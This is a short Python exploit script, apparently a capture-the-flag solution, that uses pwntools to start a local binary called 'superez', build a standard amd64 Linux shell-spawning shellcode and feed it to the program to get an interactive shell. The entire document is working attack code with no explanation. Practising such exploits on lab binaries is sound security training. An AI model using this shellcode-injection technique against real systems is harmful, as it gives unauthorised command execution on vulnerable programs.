from pwn import *
context.arch = 'amd64'

p = process("./superez")

shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())

p.sendline(shellcode)
p.interactive()